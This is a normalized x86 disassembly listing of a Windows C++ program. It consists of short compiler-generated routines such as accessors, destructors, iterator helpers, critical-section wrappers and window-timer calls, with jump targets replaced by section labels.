test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_418220
mov eax [ ecx ]
retn
sub_418230
mov eax ecx
retn
sub_418240
mov eax ecx
add [ eax ] 0x8
retn
sub_418250
mov eax [ ecx ]
retn
sub_418260
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_418270
mov eax ecx
retn 0x4
sub_418280
mov eax [ ecx ]
retn
sub_418290
mov edx [ ecx ]
lea eax [ edx + 0x8 ]
mov [ ecx ] eax
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_4182a0
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_4182c0
mov eax ecx
retn 0x4
sub_418380
mov eax ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_4184e0
push esi
mov esi ecx
call sub_418460
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4186f0
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x10 ] ecx
retn
sub_418710
retn
sub_418b20
xor eax eax
retn 0x10
sub_418b30
xor eax eax
retn 0x10
sub_418f40
mov eax [ ecx + 0x4 ]
push 0x0
push 0x0
push 0x68
push eax
call [ PostMessageW@IAT ]
xor eax eax
retn 0x10
sub_418f60
push esi
mov esi ecx
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x4 ]
push 0x0
push eax
push 0x1
push ecx
call [ SetTimer@IAT ]
mov [ esi + 0x4c ] 0x1
pop esi
retn
sub_419040
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push 0x430
push eax
call [ KillTimer@IAT ]
mov ecx [ esi + 0x4 ]
push ecx
call [ DestroyWindow@IAT ]
xor eax eax
pop esi
retn 0x10
sub_4191b0
push esi
mov esi ecx
call sub_4190f0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4192a0
push ecx
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
retn
push eax
call sub_42cee0
sub_4193d0
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push edx
call [ Ordinal_ATL71_11@IAT ]
mov [ esi + 0x28 ] 0xfefefefe
pop esi
retn 0x8
sub_419400
mov eax ecx
mov [ eax ] 0x0
retn
sub_419410
mov eax [ ecx ]
retn
sub_419420
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
retn
push 0x80004003
call sub_42cee0
sub_4194a0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4194b0
mov eax r--data
retn
sub_4194c0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_4195b0
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x2c ]
push eax
push r--data
push ecx
call [ Ordinal_ATL71_11@IAT ]
mov [ esi + 0x28 ] 0xfefefefe
pop esi
retn
sub_4195d0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4195e0
push esi
mov esi ecx
call sub_403d70
mov eax esi
pop esi
retn
sub_4195f0
mov eax r--data
retn
sub_419700
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov [ eax ] 0x1
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_419720
mov eax 0x1
retn 0x4
sub_419730
mov eax 0x1
retn 0x4
sub_419900
push esi
mov esi ecx
call sub_403d70
mov eax esi
pop esi
retn
sub_4199f0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
mov ecx rw-data
call sub_406080
retn 0x10
sub_41a470
mov ecx [ esp + 0x4 ]
call sub_419ec0
retn 0x4
sub_41a6d0
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
sub_41a6f0
mov [ ecx ] r--data
add ecx 0x4
push ecx
call [ DeleteCriticalSection@IAT ]
retn
sub_41a710
add ecx 0x4
push ecx
call [ EnterCriticalSection@IAT ]
retn
sub_41a720
add ecx 0x4
push ecx
call [ LeaveCriticalSection@IAT ]
retn
sub_41a760
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] eax
add eax 0x4
push eax
call [ EnterCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x4
sub_41a780
mov eax [ ecx ]
add eax 0x4
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_41a7c0
mov eax ecx
retn
sub_41a7d0
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_41a7e0
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_41a7f0
mov eax [ ecx ]
retn
sub_41a830
mov eax ecx
retn 0x4
sub_41a840
mov eax [ ecx ]
retn
sub_41a850
mov eax [ esp + 0x4 ]
add eax 0x39
retn
sub_41a860
mov eax [ esp + 0x4 ]
retn
sub_41a870
mov eax [ esp + 0x4 ]
add eax 0x4
retn
sub_41a880
mov eax [ esp + 0x4 ]
add eax 0x8
retn
sub_41a890
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_41a8a0
mov eax [ ecx + 0x8 ]
retn
sub_41a8b0
mov eax [ ecx + 0x4 ]
add eax 0x8
retn
sub_41a8c0
mov eax [ esp + 0x4 ]
retn
sub_41a8d0
mov eax ecx
retn 0x4
sub_41a8e0
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_41a8f0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41a900
mov eax [ ecx ]
add eax 0xc
retn
sub_41a910
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41a920
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ eax ]
imul ecx ecx 0x1c
add edx ecx
mov [ eax ] edx
retn 0x4
sub_41a940
mov eax [ esp + 0x4 ]
add eax 0x38
retn
sub_41a950
mov eax [ ecx + 0x4 ]
retn
sub_41a960
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_41a970
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_41a9e0
mov eax ecx
mov [ eax ] 0x0
retn
sub_41a9f0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov dl [ ecx ]
mov [ eax + 0x4 ] dl
retn 0x8
sub_41aa10
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x39 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x39 ]
test dl dl
je r-xdata
sub_41aa30
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x39 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x39 ]
test dl dl
je r-xdata
sub_41aa50
mov eax 0x5d1745d
retn
sub_41ab20
mov eax ecx
retn 0x4
sub_41ab30
retn
sub_41ab40
mov eax [ esp + 0x4 ]
imul eax eax 0x1c
push eax
call sub_42e3bc
add esp 0x4
retn
sub_41ab60
mov eax ecx
retn 0x4
sub_41ab70
mov eax ecx
retn 0x4
sub_41ab80
mov eax [ esp + 0x4 ]
imul eax eax 0x3c
push eax
call sub_42e3bc
add esp 0x4
retn
sub_41aba0
push ecx
mov al [ esp + 0x3 ]
pop ecx
retn
sub_41abf0
push ecx
mov al [ esp + 0x3 ]
pop ecx
retn
sub_41ac00
push esi
mov esi ecx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_41ac20
mov eax ecx
add [ eax ] 0x1c
retn
sub_41ac30
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_41ac40
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_41ac60
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_41ac70
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41ac80
mov eax [ ecx ]
add eax 0xc
retn
sub_41ac90
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41aca0
mov ecx [ ecx + 0x8 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41acb0
mov edx [ esp + 0x8 ]
mov eax [ ecx ]
imul edx edx 0x1c
add edx eax
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_41acd0
mov eax [ ecx + 0x4 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41ad30
retn 0x4
sub_41ad40
mov eax [ esp + 0x4 ]
imul eax eax 0x1c
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_41ad60
mov eax ecx
mov [ eax ] 0x0
retn
sub_41ad70
mov eax 0x9249249
retn
sub_41ae50
push esi
mov esi ecx
call sub_41aac0
mov eax esi
pop esi
retn
sub_41ae60
push esi
mov esi ecx
call sub_41aa60
mov eax esi
pop esi
retn
sub_41ae70
mov eax ecx
retn 0x8
sub_41ae80
mov eax [ esp + 0x4 ]
imul eax eax 0x3c
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_41aea0
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_41abb0
add esp 0x14
retn
sub_41aec0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_41aee0
mov ecx [ esp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_41aef0
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_41af60
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41af70
mov eax [ ecx ]
add eax 0xc
retn
sub_41af80
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x4 ]
imul eax eax 0x1c
add eax edx
retn 0x4
sub_41af90
mov eax [ esp + 0x8 ]
push eax
call sub_41ace0
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_41b000
push esi
mov esi ecx
call sub_41aac0
mov eax esi
pop esi
retn
sub_41b010
push esi
mov esi ecx
call sub_41aa60
mov eax esi
pop esi
retn
sub_41b020
mov eax ecx
retn 0x8
sub_41b030
push esi
mov esi [ ecx ]
call sub_41aac0
mov eax [ esp + 0x8 ]
mov [ eax ] esi
pop esi
retn 0x8
sub_41b050
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_41b070
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
retn 0x4
sub_41b080
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_41af10
add esp 0x8
retn 0x8
sub_41b100
mov eax ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_41b110
mov eax ecx
retn 0x8
sub_41b1aa
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
xor edx edx
push edx
push edx
call _CxxThrowException
sub_41b25a
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call _CxxThrowException
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
sub_41b2ea
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call _CxxThrowException
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
sub_41b630
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_41b1f0
add esp 0x14
retn 0xc
sub_41b737
mov ecx [ ebp - 0x14 ]
call sub_41b5e0
push 0x0
push 0x0
call _CxxThrowException
j_sub_41b5e0
jmp sub_41b5e0
j_sub_41b5e0#2
jmp sub_41b5e0
sub_41bac0
push esi
mov esi ecx
call sub_41b880
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_41bb64
mov edx [ ebp - 0x14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_41bb80
mov ecx [ esp + 0x4 ]
jmp sub_41b880
sub_41bd30
mov ecx [ esp + 0x4 ]
call sub_41b880
retn 0x4
sub_41c7a0
push esi
mov esi ecx
call sub_41c6b0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_41c860
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_41c870
mov eax [ ecx ]
retn
sub_41c880
mov ecx [ ecx ]
mov edx [ esp + 0x4 ]
xor eax eax
cmp ecx edx
sete al
retn 0x4
sub_41c890
mov eax [ ecx ]
retn
sub_41c8a0
mov eax [ ecx ]
retn
sub_41c8b0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov edx [ ecx ]
mov [ eax + 0x4 ] edx
retn 0x8
sub_41c8d0
mov eax [ ecx + 0x4 ]
retn
sub_41c8e0
mov eax ecx
retn
sub_41c8f0
mov eax ecx
retn 0x4
sub_41c900
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_41c920
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x19 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x19 ]
test dl dl
je r-xdata
sub_41c940
mov eax ecx
retn 0x4
sub_41c9b0
retn
sub_41c9c0
mov eax ecx
retn 0x4
sub_41c9d0
mov eax ecx
retn 0x4
sub_41c9e0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_41ca00
mov eax [ ecx ]
add eax 0xc
retn
sub_41ca10
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_41ca20
retn 0x4
sub_41ca30
mov eax ecx
retn 0x8
sub_41ca40
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_41ca60
push esi
mov esi ecx
call sub_41c950
mov eax esi
pop esi
retn
sub_41ca70
mov eax [ ecx ]
add eax 0xc
retn
sub_41cae0
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41cb7a
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
xor edx edx
push edx
push edx
call _CxxThrowException
sub_41cba0
push esi
mov esi ecx
call sub_41c950
mov eax esi
pop esi
retn
sub_41cbb0
mov eax [ ecx ]
add eax 0xc
retn
sub_41cc70
mov eax ecx
retn 0x8
sub_41cc80
push esi
mov esi [ ecx ]
call sub_41c950
mov eax [ esp + 0x8 ]
mov [ eax ] esi
pop esi
retn 0x8
sub_41cdf0
push esi
mov esi ecx
call sub_41cca0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_41cef0
mov ecx [ esp + 0x4 ]
jmp sub_41cca0
sub_41cf00
mov ecx [ esp + 0x4 ]
call sub_41cca0
retn 0x4
sub_41e1c0
mov edx [ ecx + 0x18 ]
xor eax eax
test edx edx
setne al
retn
sub_41e50a
mov eax 0x1
retn
sub_41e8a0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41e8b0
mov eax [ esp + 0x4 ]
mov edx [ eax ]
mov ecx [ ecx ]
sub ecx edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
retn 0x4
sub_41e8d0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ eax ]
imul ecx ecx 0x1c
add edx ecx
mov [ eax ] edx
retn 0x4
sub_41e960
push esi
mov esi ecx
call sub_41e1d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_41edb0
mov ecx [ ecx + 0x8 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41edc0
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_41edd0
mov edx [ esp + 0x8 ]
mov eax [ ecx ]
imul edx edx 0x1c
add edx eax
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_41edf0
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
retn 0x4
sub_41ee10
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_41e920
add esp 0x14
retn
sub_41f198
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call _CxxThrowException
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
sub_41f3db
mov edx [ ebp - 0x34 ]
push edx
mov esi [ ebp - 0x38 ]
push esi
mov ecx [ ebp - 0x3c ]
call sub_41b5b0
push esi
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_420520
mov eax [ esp + 0x4 ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
retn
sub_4205a0
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ rw-data ] 0x0
sub_420610
add ecx 0x20
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
sub_420670
add ecx 0x40
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
sub_420680
mov eax [ ecx + 0x3c ]
retn
sub_420690
mov eax [ esp + 0x4 ]
mov [ ecx + 0x3c ] eax
retn 0x4
sub_4206a0
cmp [ ecx + 0x3c ] 0x4
sete al
retn
sub_4206f0
push esi
mov esi ecx
call sub_4204b0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4234d0
mov eax ecx
retn
sub_4234e0
mov eax [ esp + 0x4 ]
add eax 0x11
retn
sub_4234f0
mov eax [ esp + 0x4 ]
retn
sub_423500
mov eax [ esp + 0x4 ]
add eax 0x8
retn
sub_423510
mov eax [ ecx + 0x4 ]
retn
sub_423520
mov eax [ esp + 0x4 ]
retn
sub_423530
mov eax ecx
retn
sub_423540
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov edx [ esp + 0x8 ]
cmp ecx [ edx ]
sbb eax eax
neg eax
retn 0x8
sub_423560
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_423570
mov eax [ ecx ]
retn
sub_423580
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_423590
mov eax [ ecx ]
retn
sub_4235a0
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_4235b0
mov eax [ ecx ]
retn
sub_423620
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov dl [ ecx ]
mov [ eax + 0x4 ] dl
retn 0x8
sub_423640
mov eax [ esp + 0x4 ]
add eax 0x35
retn
sub_423650
mov eax [ esp + 0x4 ]
retn
sub_423660
mov eax [ esp + 0x4 ]
add eax 0x4
retn
sub_423670
mov eax [ esp + 0x4 ]
add eax 0x8
retn
sub_423680
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_423690
mov eax [ ecx + 0x8 ]
retn
sub_4236a0
mov eax [ ecx + 0x4 ]
add eax 0x8
retn
sub_4236b0
mov eax [ esp + 0x4 ]
retn
sub_4236c0
mov eax ecx
retn 0x4
sub_4236d0
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_4236e0
mov eax [ esp + 0x4 ]
add eax 0x10
retn
sub_4236f0
mov eax [ esp + 0x4 ]
add eax 0x4
retn
sub_423700
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_423710
mov eax [ ecx + 0x4 ]
add eax 0x8
retn
sub_423720
mov eax ecx
retn 0x4
sub_423730
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_423740
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_423750
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_423760
mov eax [ ecx ]
add eax 0xc
retn
sub_423770
mov eax [ esp + 0x4 ]
add eax 0x45
retn
sub_423780
mov eax [ esp + 0x4 ]
retn
sub_423790
mov eax [ esp + 0x4 ]
add eax 0x8
retn
sub_4237a0
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_4237b0
mov eax [ ecx + 0x8 ]
retn
sub_4237c0
mov eax [ ecx + 0x4 ]
add eax 0x8
retn
sub_4237d0
mov eax [ esp + 0x4 ]
retn
sub_4237e0
mov eax ecx
retn
sub_4237f0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_423800
mov eax [ ecx ]
add eax 0xc
retn
sub_423810
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov edx [ ecx ]
mov [ eax + 0x4 ] edx
retn 0x8
sub_423830
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov edx [ ecx ]
mov [ eax + 0x4 ] edx
retn 0x8
sub_423850
mov eax [ esp + 0x4 ]
add eax 0x34
retn
sub_423860
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_423870
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_4238e0
mov eax 0x3fffffff
retn
sub_4238f0
mov eax ecx
mov [ eax ] 0x0
retn
sub_423900
mov eax [ esp + 0x4 ]
add eax 0x44
retn
sub_423910
mov eax [ esp + 0x4 ]
add eax 0x4
retn
sub_423920
mov eax [ esp + 0x4 ]
retn 0x4
sub_423930
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_423940
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_4239b0
mov eax ecx
retn 0x4
sub_4239c0
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_4239d0
mov eax ecx
mov [ eax ] 0x0
retn
sub_4239e0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov dl [ ecx ]
mov [ eax + 0x4 ] dl
retn 0x8
sub_423a30
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov dl [ ecx ]
mov [ eax + 0x4 ] dl
retn 0x8
sub_423a50
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x35 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x35 ]
test dl dl
je r-xdata
sub_423a70
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x35 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x35 ]
test dl dl
je r-xdata
sub_423a90
mov eax 0x6666666
retn
sub_423aa0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x11 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x11 ]
test dl dl
je r-xdata
sub_423ac0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x11 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x11 ]
test dl dl
je r-xdata
sub_423b40
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x45 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x45 ]
test dl dl
je r-xdata
sub_423b60
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x45 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x45 ]
test dl dl
je r-xdata
sub_423b80
mov eax 0x4924924
retn
sub_423c50
mov eax ecx
retn 0x4
sub_423c60
mov eax ecx
retn 0x4
sub_423c70
mov eax ecx
retn 0x4
sub_423c80
retn
sub_423c90
retn
sub_423ca0
mov eax ecx
retn 0x4
sub_423cb0
mov eax ecx
retn 0x4
sub_423cc0
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
push eax
call sub_42e3bc
add esp 0x4
retn
sub_423ce0
retn
sub_423cf0
mov eax ecx
retn 0x4
sub_423d00
mov eax [ esp + 0x4 ]
imul eax eax 0x38
push eax
call sub_42e3bc
add esp 0x4
retn
sub_423d20
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_423d40
mov eax ecx
retn 0x4
sub_423d50
retn
sub_423d60
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_423d80
mov eax ecx
retn 0x4
sub_423d90
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 8 ]
shl eax 0x3
push eax
call sub_42e3bc
add esp 0x4
retn
sub_423db0
mov eax ecx
retn 0x4
sub_423dc0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_423e20
mov eax [ esp + 0x4 ]
retn
sub_423e30
mov eax [ esp + 0x4 ]
retn
sub_423e90
mov eax [ ecx ]
